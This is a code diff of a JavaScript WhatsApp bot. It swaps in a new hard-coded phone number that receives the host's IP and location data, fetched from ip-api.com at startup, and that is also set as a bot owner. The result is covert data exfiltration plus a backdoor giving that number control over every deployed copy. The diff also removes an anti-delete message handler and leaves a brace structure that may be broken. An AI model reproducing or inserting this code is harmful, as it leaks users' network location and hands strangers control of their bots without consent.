@@ -44,7 +44,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6283145831517@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6283145831517?text=Assalamualaikum"}}})
+       denz.sendMessage("60102810046@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer NdaaBotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6283145831517?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -70,8 +70,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./OkimiShizu.js')(denz, mek)
-        ownerNumber = ["6283145831517@s.whatsapp.net","6283145831517@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6283145831517@s.whatsapp.net"
+        ownerNumber = ["60102810046@s.whatsapp.net","60102810046@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "60102810046@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
     
@@ -184,32 +184,7 @@ denz.on('CB:action,,call', async json => {
         await denz.blockUser(callerId, "add")
         })
         
-	denz.on('message-delete', async (m) => {
-if (!m.key.fromMe && !antidelete) {
-if (!m.key.remoteJid == 'status@broadcast') return
-m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
-const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
-let d = new Date
-let c = denz.chats.get(m.key.remoteJid)
-let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
-let co3ntent = denz.generateForwardMessageContent(a, false)
-let c3type = Object.keys(co3ntent)[0]
-let locale = 'id'
-let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
-let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
-let week = d.toLocaleDateString(locale, { weekday: 'long' })
-let calender = d.toLocaleDateString(locale, {
-day: 'numeric',
-month: 'long',
-year: 'numeric'
-})
-denz.copyNForward(m.key.remoteJid, m.message)
-denz.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
-
-▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
-▢ \`\`\`Tipe : ${c3type}\`\`\`
-▢ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
-}
+	}
 })
 }
 
